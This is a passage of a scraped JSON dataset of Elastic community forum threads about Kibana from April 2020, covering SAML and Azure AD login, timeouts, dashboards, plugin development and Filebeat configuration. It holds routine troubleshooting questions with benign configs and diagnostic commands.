    "body": "Is it possible to use Azure Active Directory with the Elastic Cloud Kibana? I see this other article, but it looks like this is probably on-premises? SAML configuration - Azure Active Directory Elasticsearch I resolved this myself. I was missing the role mapping from AD roles -> elasticsearch roles. Thanks for your help! and https://www.elastic.co/guide/en/x-pack/current/active-directory-realm.html If there is a good article to set this up that would be nice to see. Thanks! Jeff",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "85ab83c9-c795-4252-8e5c-90cdc09ad26c",
    "url": "https://discuss.elastic.co/t/timelion-inconsistent-information/229147",
    "title": "Timelion inconsistent information",
    "category": [
      "Kibana"
    ],
    "author": "bevano",
    "date": "April 21, 2020, 11:57pm April 22, 2020, 8:36am",
    "body": "Hey Guys, Pretty new to ELK. I am trying to use Timelion to visualise historical trends since December and this is searching multiple indices totalling around 600gb, however searches never complete first time. It takes maybe 5-6 retries before it obtains the correct information, with the 3rd-5th retries getting partial information. I have already increased the Kibana timeout (elasticsearch.requestTimeout: 600000). Just wondering whether there is anything else I can do to get the information first time? I am wondering whether it is my hardware/infrastructure or am I doing something wrong My setup is 3 master nodes, 4 data nodes (4CPUs, 24GB RAM). These are VMs running on a NFS share in RAID 6. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "12c79e79-9a9f-4719-bf5e-76de0f85e427",
    "url": "https://discuss.elastic.co/t/term-join-not-yielding-results-when-using-keyword-field-as-left-source/229080",
    "title": "Term join not yielding results when using Keyword field as left source",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 21, 2020, 11:22pm April 21, 2020, 9:14pm April 21, 2020, 11:24pm April 22, 2020, 12:22am April 22, 2020, 8:22am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b19bf1ad-b177-4024-b785-3db7bde09d23",
    "url": "https://discuss.elastic.co/t/metricbeat-system-dashboard-not-show-metric-below-the-time-range-of-30-minutes/229185",
    "title": "Metricbeat System dashboard not show metric below the time range of 30 minutes",
    "category": [
      "Kibana"
    ],
    "author": "raghumuppa",
    "date": "April 22, 2020, 6:34am April 22, 2020, 7:08am",
    "body": "Hello Everyone, Since two days i'm facing an issue with kibana dashboard, i unable to see proper metric with in the time range of 30 min. This issue was not there before, i went through google and spent lot of time over there but no proper solution. I updated ELK 7.5.2 to latest release 7.6.2 but issue remains same I found below link, but myself i felt this is not the proper solution because whenever i run metribeat setup -e changes are reverting to normal and issue comes back again, and also changing settings at @Paneloptions --> @interval from auto to 1m is only working after two or three refresh. https://discuss.elastic.co/t/kibana-metricbeat-system-dashboard-not-working-correctly-with-time-range-15-minutes-or-less/127140 could you please anyone help me out from this issue, it is really irritating me, Plz find the screen shot image1825×722 80.3 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c27b842c-dc36-4ffc-83ec-6323d18961b2",
    "url": "https://discuss.elastic.co/t/organization-of-dashboard-objects/229146",
    "title": "Organization of dashboard objects",
    "category": [
      "Kibana"
    ],
    "author": "dataplatform12345",
    "date": "April 21, 2020, 11:53pm April 22, 2020, 12:18am April 22, 2020, 12:54am April 22, 2020, 5:17am",
    "body": "Hi, What are the typical ways to organize dashboard and visualization objects in a multi-tenant implementation of elastic stack. Is the Kibana Space the preferred and only approach ? Is it possible to create folders or sub-folders within a Space to further categorize various dashboards developed by the team.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d8242c85-cea0-43ae-8c8f-8bec80ba41b2",
    "url": "https://discuss.elastic.co/t/kibana-not-able-to-login-using-saml/227321",
    "title": "Kibana- not able to login using saml",
    "category": [
      "Kibana"
    ],
    "author": "jbaskaran_123",
    "date": "April 9, 2020, 12:50pm April 10, 2020, 4:29am April 13, 2020, 5:52am April 13, 2020, 6:29am April 13, 2020, 6:46am April 13, 2020, 7:04am April 13, 2020, 7:10am April 17, 2020, 9:43am April 17, 2020, 9:53am April 18, 2020, 9:28am April 22, 2020, 4:20am",
    "body": "We have configured SAML for our Elasticsearch cluster running in Kubernetes. when I hit the application URL, it redirects to IDP login (IDMS) but after logging in it shows \"you are not authorized to use this application\". Below the configuration in kibana: kibana kibana.yml: | server: host: 0.0.0.0 xpack.security.enabled: true server.ssl.enabled: true server.ssl.key: /usr/share/kibana/config/tls_server/key.pem server.ssl.certificate: /usr/share/kibana/config/tls_server/crt.pem xpack.security.public: protocol: https hostname: {hostname} port: 443 elasticsearch.url: \"https://es-coordinating.{namespace}.svc.lb.{ APC_CLUSTER_NAME}.applecloud.io:443\" elasticsearch.username: elastic elasticsearch.password: ******* elasticsearch.ssl.certificateAuthorities: /usr/share/kibana/config/tls_server/crt.pem xpack.monitoring.enabled: true xpack.monitoring.kibana.collection.enabled: true xpack.monitoring.ui.enabled: false logging.dest: /var/log/kibana.log xpack.security.authProviders: [saml] server.xsrf.whitelist: [/api/security/v1/saml] Elasticsearch configuration:* xpack.security.authc.realms.saml1: ### saml is for kibana type: saml order: 2 ### order in which it appears in the realm chain idp.metadata.path: /usr/share/elasticsearch/config/saml/idp-metadata.xml idp.entity_id: \"AppleSSO\" sp.entity_id: \"https://gbiobserver-events-dev.corp.apple.com\" sp.acs: \"https://gbiobserver-events-dev.corp.apple.com:443/api/security/v1/saml\" sp.logout: \"https://gbiobserver-events-dev.corp.apple.com:443/logout\" attributes.principal: \"nameid:persistent\" attributes.groups: Groups encryption.key: /usr/share/elasticsearch/config/saml-cert/tls.key encryption.certificate: /usr/share/elasticsearch/config/saml-cert/tls.crt We see all configurations looks correct in IDMS configuration. But still getting error while accessing. Looking forward for your assistance.",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "147d9bfe-b778-4e86-8247-a6d88638ff45",
    "url": "https://discuss.elastic.co/t/intercept-every-request-from-kibana-plugin/229021",
    "title": "Intercept every request from Kibana plugin",
    "category": [
      "Kibana"
    ],
    "author": "Digl1",
    "date": "April 21, 2020, 11:28am April 21, 2020, 12:40pm April 21, 2020, 1:15pm April 21, 2020, 1:20pm April 21, 2020, 1:22pm April 21, 2020, 1:22pm April 21, 2020, 1:23pm April 21, 2020, 1:29pm April 21, 2020, 1:35pm April 21, 2020, 2:21pm April 21, 2020, 2:25pm April 21, 2020, 2:28pm April 21, 2020, 2:38pm April 21, 2020, 2:39pm April 21, 2020, 2:46pm April 21, 2020, 3:53pm April 21, 2020, 9:06pm April 22, 2020, 10:08am April 22, 2020, 3:04am",
    "body": "Hi, I have tried a lot, but I can't really get it to work. I want to intercept all requests from kibana to elastic and modify the HTTP request Headers. I am also not sure what the correct approach to this would be - should I try to use kfetch? Or is the better approach $http (I think this is the old deprecated way)? If kfetch is the right way, how do I add it to my plugin (do I need to add it to package.json)? And how do I reference it in a .js file? import { kfetch } from '../../../../src/legacy/ui/public/kfetch/'; module.exports = { init : function(){ kfetch.interceptors.push({ request: async function(config) { Logger.log(\"request intercepted\") // do something with request return config; } }); } } Doing it like this, I get: FATAL Error: Cannot find module 'ui/new_platform' If I import from 'ui/kfetch' I get the following error message: FATAL Error: Cannot find module 'ui/kfetch' Please help me with this - I have gotten so far with my custom plugin and this is the last piece of the puzzle... (Kibana version 7.6.2) Thank you!",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "991d5c36-ed2b-4f83-91b7-9230cbc3d7d3",
    "url": "https://discuss.elastic.co/t/version-control-and-backup-of-dashboard-visualization-query-object/229148",
    "title": "Version control and backup of dashboard/visualization/query object",
    "category": [
      "Kibana"
    ],
    "author": "dataplatform12345",
    "date": "April 22, 2020, 12:33am April 22, 2020, 2:59am",
    "body": "What's the best way to implement an automatic version control and backup system for all the objects created in Kibana for visualization and querying? Should we use export/import API to collect the latest content and push the files to Git repo external to Elastic Stack? Any built-in Git integration? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6fe3484b-9d5c-49cb-9dd2-c5cdd1bae268",
    "url": "https://discuss.elastic.co/t/kibana-server-is-not-ready-clean-new-install/228709",
    "title": "Kibana server is not ready-- clean new install",
    "category": [
      "Kibana"
    ],
    "author": "x0rcist",
    "date": "April 19, 2020, 8:14am April 22, 2020, 2:32am",
    "body": "Hi, I followed this post https://www.lahilabs.com/2020/01/02/how-to-install-elk-siem-for-beginners-complete-guide/ I have running elastic curl localhost:9200 { \"name\" : \"vultr.guest\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"na\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"deb\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } but for Kibana when run curl localhost:5601 Kibana server is not ready --- when run status service kibana status ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; disabled; vendor preset: enabled) Active: active (running) since Sun 2020-04-19 07:45:54 UTC; 25min ago Main PID: 10430 (node) Tasks: 11 (limit: 2317) CGroup: /system.slice/kibana.service └─10430 /usr/share/kibana/bin/../node/bin/node /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml Apr 19 07:48:32 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:32Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"Unable to revive connection: http://0.0.0.0:9200/\"} Apr 19 07:48:32 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:32Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"No living connections\"} Apr 19 07:48:35 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:35Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"Unable to revive connection: http://0.0.0.0:9200/\"} Apr 19 07:48:35 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:35Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"No living connections\"} Apr 19 07:48:37 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:37Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"Unable to revive connection: http://0.0.0.0:9200/\"} Apr 19 07:48:37 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:37Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"No living connections\"} Apr 19 07:48:40 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:40Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"Unable to revive connection: http://0.0.0.0:9200/\"} Apr 19 07:48:40 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:40Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":10430,\"message\":\"No living connections\"} Apr 19 07:48:42 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:48:42Z\",\"tags\":[\"info\",\"savedobjects-service\"],\"pid\":10430,\"message\":\"Starting saved objects migrations\"} Apr 19 07:49:12 vultr.guest kibana[10430]: {\"type\":\"log\",\"@timestamp\":\"2020-04-19T07:49:12Z\",\"tags\":[\"warning\",\"savedobjects-service\"],\"pid\":10430,\"message\":\"Unable to connect to Elasticsearch. Error: Request Timeout after 30000ms\"} root@vultr:/var/log/elasticsearch# My kibana setting is Screen Shot 2020-04-19 at 6.12.41 pm1258×824 271 KB Any advise what am I doing wrong here?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0729aad-5838-4fc2-96d4-47630b2ca862",
    "url": "https://discuss.elastic.co/t/503-error-because-of-request-timeout-after-30000ms/229097",
    "title": "503 error because of request timeout after 30000ms",
    "category": [
      "Kibana"
    ],
    "author": "hamidZa",
    "date": "April 21, 2020, 4:56pm April 22, 2020, 2:24am",
    "body": "Hello Everyone, I am new to ELK stack, I am trying to install elasticsearch and kibana using containers, and can't get kibana to work. docker run -d --pod elk -e ELASTICSEARCH_HOSTS=http://localhost:9200 --name kibana docker.elastic.co/kibana/kibana:7.6.2 docker run -d --pod elk --name elasticsearch --ulimit=host -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:7.6.2 I made sure ES is reachable from the kibana (and from the outside) curl \"http://localhost:9200\" gives { \"name\" : \"elk\", \"cluster_name\" : \"docker-cluster\", \"cluster_uuid\" : \"YmAj-PyDQQKE5ikqo0BZQw\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"docker\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } and curl -XGET localhost:9200/_cluster/allocation/explain?pretty { \"index\" : \"test-index\", \"shard\" : 0, \"primary\" : false, \"current_state\" : \"unassigned\", \"unassigned_info\" : { \"reason\" : \"CLUSTER_RECOVERED\", \"at\" : \"2020-04-21T16:03:38.658Z\", \"last_allocation_status\" : \"no_attempt\" }, \"can_allocate\" : \"no\", \"allocate_explanation\" : \"cannot allocate because allocation is not permitted to any of the nodes\", \"node_allocation_decisions\" : [ { \"node_id\" : \"wrpctUmgQfa8fRO0qEPCnQ\", \"node_name\" : \"elk\", \"transport_address\" : \"10.0.2.100:9300\", \"node_attributes\" : { \"ml.machine_memory\" : \"8206983168\", \"xpack.installed\" : \"true\", \"ml.max_open_jobs\" : \"20\" }, \"node_decision\" : \"no\", \"deciders\" : [ { \"decider\" : \"same_shard\", \"decision\" : \"NO\", \"explanation\" : \"the shard cannot be allocated to the same node on which a copy of the shard already exists [[test-index][0], node[wrpctUmgQfa8fRO0qEPCnQ], [P], s[STARTED], a[id=dpZ_qktvTEOj36phH37oIw]]\" } ] } ] } The logs give me this: {\"type\":\"response\",\"@timestamp\":\"2020-04-21T16:41:09Z\",\"tags\":[],\"pid\":2,\"method\":\"get\",\"statusCode\":503,\"req\":{\"url\":\"/\",\"method\":\"get\",\"headers\":{\"host\":\"localhost:5601\",\"user-agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\",\"accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\"accept-language\":\"en-US,en;q=0.5\",\"accept-encoding\":\"gzip, deflate\",\"connection\":\"keep-alive\",\"upgrade-insecure-requests\":\"1\",\"dnt\":\"1\"},\"remoteAddress\":\"127.0.0.1\",\"userAgent\":\"127.0.0.1\"},\"res\":{\"statusCode\":503,\"responseTime\":30082,\"contentLength\":9},\"message\":\"GET / 503 30082ms - 9.0B\"} {\"type\":\"log\",\"@timestamp\":\"2020-04-21T16:41:49Z\",\"tags\":[\"warning\",\"monitoring\",\"kibana-monitoring\"],\"pid\":2,\"message\":\"Error: Request Timeout after 30000ms\\n at /usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:397:9\\n at Timeout.<anonymous> (/usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:429:7)\\n at ontimeout (timers.js:436:11)\\n at tryOnTimeout (timers.js:300:5)\\n at listOnTimeout (timers.js:263:5)\\n at Timer.processTimers (timers.js:223:10)\"} {\"type\":\"log\",\"@timestamp\":\"2020-04-21T16:41:49Z\",\"tags\":[\"warning\",\"monitoring\",\"kibana-monitoring\"],\"pid\":2,\"message\":\"Unable to bulk upload the stats payload to the local cluster\"} {\"type\":\"log\",\"@timestamp\":\"2020-04-21T16:41:59Z\",\"tags\":[\"warning\",\"monitoring\",\"kibana-monitoring\"],\"pid\":2,\"message\":\"Error: Request Timeout after 30000ms\\n at /usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:397:9\\n at Timeout.<anonymous> (/usr/share/kibana/node_modules/elasticsearch/src/lib/transport.js:429:7)\\n at ontimeout (timers.js:436:11)\\n at tryOnTimeout (timers.js:300:5)\\n at listOnTimeout (timers.js:263:5)\\n at Timer.processTimers (timers.js:223:10)\"} I tried to connect to ES using python and it works fine.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7c85cd71-545e-4ec8-bb31-667bec92a0d1",
    "url": "https://discuss.elastic.co/t/field-formatter-registration-kibana-7-6-2/228544",
    "title": "Field Formatter registration Kibana 7.6.2",
    "category": [
      "Kibana"
    ],
    "author": "Paul_Gege",
    "date": "April 17, 2020, 4:15pm April 22, 2020, 2:07am",
    "body": "Hi, I attempted to register my plugin using this: Here is how I used it: But I get this error: image741×347 53.8 KB I changed the code to this (passing an array with my field formatter): However the page to edit field types comes up blank on kibana image1675×793 34.4 KB Can someone provide some insight as to what I can do to register my field formatter plugin?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "73dcb284-545d-4317-b283-3f30ef1a7e44",
    "url": "https://discuss.elastic.co/t/how-to-store-a-file-to-elastic-search-from-kibana-plugin-server/228969",
    "title": "How to store a file to elastic search from kibana plugin server",
    "category": [
      "Kibana"
    ],
    "author": "dorioued",
    "date": "April 21, 2020, 6:02am April 22, 2020, 12:02am",
    "body": "Hi Team, I am developing a kibana plugin that generate a file containing the data selected by the user on the plugin interface. After that I should be able to generate a link that the user can use to download the created file . Now I am at a point where I need to store the file and I was thinking of storing it in elastic search and provide the link for downloads. How can I do that from my kibana server ? Also how can I talk to elastic search om my server? I am making APIs call to the static host http://localhost:9200/. But I wanna do it dynamically since it will be a plugin and the elastic search host my differs from one user to another. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ebe39523-3bb3-4056-b02a-31e8895c330c",
    "url": "https://discuss.elastic.co/t/how-to-query-a-specific-subset-of-transactions-starting-with-transaction-with-specific-value-of-a-specific-field/228888",
    "title": "How to query a specific subset of transactions starting with transaction with specific value of a specific field?",
    "category": [
      "Kibana"
    ],
    "author": "111167",
    "date": "April 20, 2020, 2:31pm April 21, 2020, 10:44pm",
    "body": "Hello. Kibana version: 6.4.2 In usual case, if you need to find specific subset of transactions starting with a transaction with the message field \"Unload list of items\" you may use id filter, for example. But in my case, I need to find all subsets of transactions starting with a transaction with the message field \"Unload list of items\". I didn't find any solution which can help to solve my problem. Does anyone know how to do it?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7f9aab85-0dac-4095-b117-3b26b40c7b38",
    "url": "https://discuss.elastic.co/t/unable-to-see-logs-on-kibana/228939",
    "title": "Unable to see logs on Kibana",
    "category": [
      "Kibana"
    ],
    "author": "ishan.abhinit",
    "date": "April 20, 2020, 10:24pm April 21, 2020, 12:09am April 21, 2020, 3:07pm April 21, 2020, 8:32pm April 21, 2020, 9:37pm April 21, 2020, 9:41pm April 21, 2020, 10:05pm",
    "body": "I have set up elasticsearch , kibana and filebeat on the same CentOS VM. I want to view the logs of a single file(apache_access.log) saved at the root file system on Kibana. My log file has logs specifically from 3rd to 9th Oct 2017. I have installed and configured filebeat but unable to see the logs from apache_accesslog file on Kibana. I have also loaded the kibana dashboard. Please assist. Contents of filebeat.yml file: ###################### Filebeat Configuration Example ######################### # This file is an example configuration file highlighting only the most common # options. The filebeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/filebeat/index.html # For more available modules and options, please see the filebeat.reference.yml sample # configuration file. #=========================== Filebeat inputs ============================= filebeat.inputs: # Each - is an input. Most options can be set at the input level, so # you can use different inputs for various configurations. # Below are the input specific configurations. - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /apache_access.log #- c:\\programdata\\elasticsearch\\logs\\* # Exclude lines. A list of regular expressions to match. It drops the lines that are # matching any regular expression from the list. #exclude_lines: ['^DBG'] # Include lines. A list of regular expressions to match. It exports the lines that are # matching any regular expression from the list. #include_lines: ['^ERR', '^WARN'] # Exclude files. A list of regular expressions to match. Filebeat drops the files that # are matching any regular expression from the list. By default, no files are dropped. #exclude_files: ['.gz$'] # Optional additional fields. These fields can be freely picked # to add additional information to the crawled log files for filtering #fields: # level: debug # review: 1 ### Multiline options # Multiline can be used for log messages spanning multiple lines. This is common # for Java Stack Traces or C-Line Continuation # The regexp Pattern that has to be matched. The example pattern matches all lines starting with [ #multiline.pattern: ^\\[ # Defines if the pattern set under pattern should be negated or not. Default is false. #multiline.negate: false # Match can be set to \"after\" or \"before\". It is used to define if lines should be append to a pattern # that was (not) matched before or after or as long as a pattern is not matched based on negate. # Note: After is the equivalent to previous and before is the equivalent to to next in Logstash #multiline.match: after #============================= Filebeat modules =============================== filebeat.config.modules: # Glob pattern for configuration loading path: ${path.config}/modules.d/*.yml # Set to true to enable config reloading reload.enabled: false # Period on which files under path should be checked for changes #reload.period: 10s #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 1 #index.codec: best_compression #_source.enabled: false #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #============================== Dashboards ===================================== # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: false # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: #============================== Kibana ===================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 # host: \"localhost:5601\" # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: #============================= Elastic Cloud ================================== # These settings simplify using Filebeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `<user>:<pass>`. #cloud.auth: #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"js-168-192.jetstream-cloud.org:9200\"] # Protocol - either `http` (default) or `https`. #protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" #username: \"elastic\" #password: \"changeme\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"localhost:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] #============================== X-Pack Monitoring =============================== # filebeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Filebeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: #================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "62c76e27-f035-4fc9-bf78-b8be5f8afdb8",
    "url": "https://discuss.elastic.co/t/kibana-url-template-with-relative-path/228418",
    "title": "Kibana URL template with relative path",
    "category": [
      "Kibana"
    ],
    "author": "surajbarde",
    "date": "April 16, 2020, 11:17pm April 17, 2020, 12:12am April 17, 2020, 2:37am April 17, 2020, 7:22am April 17, 2020, 4:54pm April 17, 2020, 5:28pm April 17, 2020, 10:34pm April 17, 2020, 10:42pm April 17, 2020, 10:53pm April 21, 2020, 9:01pm April 21, 2020, 9:05pm",
    "body": "I have a question regarding Kibana URL templates for fields in the index. I have used relative path for the below URL template. On local environment it is replaced with http://localhost:5601/s/reporting/app/kibana#/..... Which is expected. On my DEV and QA environment also it is replaced with http://localhost:5601 instead of http://dev.somedomain.com:5601 which is not expected. I have my DEV and QA environment Kibana on some domain (DNS name) and everything is working fine except this URL template. Kibana Setup: Version : 7.6.0 Kibana.yml server.port: 5601 server.host: \"dev.somedomain.com\" Please let me know what I am doing wrong, or point me in right direction. Thanks",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "4a881918-0ef2-4e78-983d-963235f2d3ed",
    "url": "https://discuss.elastic.co/t/built-assets-dll-folder-is-empty-in-the-kibana-tar-file-linux-generated-from-the-source-code/228958",
    "title": "Built_assets/dll folder is empty in the kibana tar file(linux) generated from the source code",
    "category": [
      "Kibana"
    ],
    "author": "Nandhini_Subburaj",
    "date": "April 21, 2020, 5:05am April 21, 2020, 8:16pm",
    "body": "I am using kibana 7.6.2. I followed this guide(https://github.com/elastic/kibana/blob/master/CONTRIBUTING.md#setting-up-your-development-environment) to create the build from the kibana source code. Build was successful and I can see tar files in the target folder also. But when I tried to install the generated kibana tar and open the kibana page, I am getting the error - \"Kibana did not load properly. Check the server output for more information.\" I tried to debug the issue. Then I came to know .., there is folder called built_assets/dlls is empty in the generated kibana tar file. But when I download the tar from the kibana release page and unzipped it . There I can see dlls folder and many files in it. Am I doing anything wrong in my build process. Please advise. Steps I followe to build: Downloaded the source code yarn kbn bootstrap yarn build --skip-os-packages",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d2ec0851-f3bb-4020-b227-065defca04b7",
    "url": "https://discuss.elastic.co/t/drill-down-in-an-aggregation-in-data-table-dynamically-on-a-dashboard/228986",
    "title": "Drill Down in an Aggregation in Data Table dynamically on a dashboard",
    "category": [
      "Kibana"
    ],
    "author": "Bhavya_Bansal",
    "date": "April 21, 2020, 8:33am April 21, 2020, 8:05pm",
    "body": "Hi, I have a data table with multiple aggregations on my dashboard, I want to be able to drill down on each cell and get the all the values that comprise that aggregation. Is there a way to achieve this in Kibana? For eg: When I click on any cell in the Average cpupct column, I would like to show all the values that made up that average Capture1817×310 48.5 KB This is a thread I found but the feature required hasn't been implemented exactly. github.com/elastic/kibana Custom drilldown links for a dashboard panel opened 12:17PM - 29 Jun 17 UTC alexfrancoeur Why this is important The ability to drill down from one dashboard to another view creates a custom workflow for troubleshooting and... Feature:Dashboard Team:KibanaApp enhancement Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "921e868c-33e6-4d20-8521-c0c4b1eccf86",
    "url": "https://discuss.elastic.co/t/how-can-we-include-a-standalone-html-page-with-scripts-inside-a-custom-kibana-plugin/228799",
    "title": "How can we include a standalone html page with scripts inside a custom Kibana plugin",
    "category": [
      "Kibana"
    ],
    "author": "pranay_bhatnagar",
    "date": "April 20, 2020, 7:32am April 21, 2020, 5:53am April 21, 2020, 8:23am April 21, 2020, 7:55pm",
    "body": "I am using custom Kibana plugin in which i want to use a external html page with many script tags inside a plugin UI. How can i include external html page and scripts inside my Kibana plugin UI.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "40b279a7-2f0a-4515-b2bd-f6e49863670d",
    "url": "https://discuss.elastic.co/t/visualizing-a-single-string-of-text-in-kibana/228693",
    "title": "Visualizing a single string of text in kibana",
    "category": [
      "Kibana"
    ],
    "author": "vikramnr",
    "date": "April 19, 2020, 2:55am April 21, 2020, 7:30pm",
    "body": "I'm trying to have markdown which will display only single value from one of the index. I tried using metric but it doesn't have the expected results. I did some SO search and found some thing create our own visuals I was wondering if anybody had done it so far or any progress has been made after that or any custom plugin for this stackoverflow.com Visualizing a single string of text in Kibana elasticsearch, visualization, kibana, kibana-4 asked by Forcent Vintier on 09:31AM - 09 Aug 16 UTC",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1b3229ca-86c0-430c-a771-9f83b95ec866",
    "url": "https://discuss.elastic.co/t/kibana-alerts-and-use-case/229071",
    "title": "Kibana alerts and use case",
    "category": [
      "Kibana"
    ],
    "author": "oumy",
    "date": "April 21, 2020, 2:33pm April 21, 2020, 5:56pm April 21, 2020, 7:07pm",
